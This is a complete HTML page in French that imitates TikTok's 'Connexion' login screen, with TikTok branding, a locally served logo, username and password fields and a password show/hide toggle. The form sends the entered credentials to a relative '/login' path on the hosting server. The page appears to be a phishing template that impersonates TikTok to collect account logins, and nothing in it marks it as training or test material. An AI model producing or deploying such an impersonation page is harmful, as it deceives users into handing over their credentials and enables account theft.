<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion | TikTok</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: black; color: #fff; display: flex; flex-direction: column; justify-content: space-between; align-items: center; height: 100vh; margin: 0; }
        .header { width: 100%; padding: 20px 24px; display: flex; justify-content: space-between; align-items: center; box-sizing: border-box; }
        .logo-container { display: flex; align-items: center; text-decoration: none; color: #fff; }
        .logo-text { font-size: 24px; font-weight: 700; letter-spacing: -0.5px; margin-left: 10px; }
        .help-link { color: #fff; text-decoration: none; font-size: 14px; font-weight: 600; }
        .login-container { width: 100%; max-width: 480px; padding: 20px; box-sizing: border-box; margin-top: -10vh; }
        h2 { text-align: center; font-size: 32px; margin-bottom: 30px; font-weight: 700; }
        .input-group { margin-bottom: 15px; position: relative; }
        .input-group input { width: 100%; padding: 14px 16px; border: 1px solid #333; border-radius: 4px; font-size: 16px; box-sizing: border-box; background-color: #222; color: #fff; }
        .input-group input:focus { outline: none; border-color: #fe2c55; }
        .toggle-password { position: absolute; right: 15px; top: 50%; transform: translateY(-50%); cursor: pointer; color: #888; font-size: 14px; font-weight: 600; }
        .forgot-password { display: block; text-align: left; color: #fff; text-decoration: none; font-size: 14px; margin-bottom: 24px; font-weight: 600; }
        .login-btn { width: 100%; padding: 14px; background-color: #fe2c55; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; }
        .footer { width: 100%; padding: 20px 24px; display: flex; justify-content: space-between; align-items: center; box-sizing: border-box; font-size: 12px; color: #888; }
    </style>
</head>
<body>

<div class="header">
    <div class="logo-container">
        <img src="tiktok.png" width="32" alt="logo_tiktok"/>
        <div class="logo-text">TikTok</div>
    </div>
    <a href="#" class="help-link">Commentaires et assistance</a>
</div>

<div class="login-container">
    <h2>Connexion</h2>
    
    <form id="tiktokForm" action="/login" method="POST">
        <div class="input-group">
            <input type="text" name="username" placeholder="E-mail ou nom d'utilisateur" required>
        </div>
        
        <div class="input-group">
            <input type="password" name="password" id="passwordField" placeholder="Mot de passe" required>
            <span class="toggle-password" id="toggleBtn">Afficher</span>
        </div>
        
        <a href="#" class="forgot-password">Mot de passe oublié ?</a>
        
        <button type="submit" class="login-btn">Se connecter</button>
    </form>
</div>

<div class="footer">
    <span>Français</span>
    <div>© 2026 - TikTok</div>
</div>

<script>
    const passwordField = document.getElementById('passwordField');
    const toggleBtn = document.getElementById('toggleBtn');

    toggleBtn.addEventListener('click', function() {
        const type = passwordField.getAttribute('type') === 'password' ? 'text' : 'password';
        passwordField.setAttribute('type', type);
        this.textContent = type === 'password' ? 'Afficher' : 'Masquer';
    });
</script>

</body>
</html>
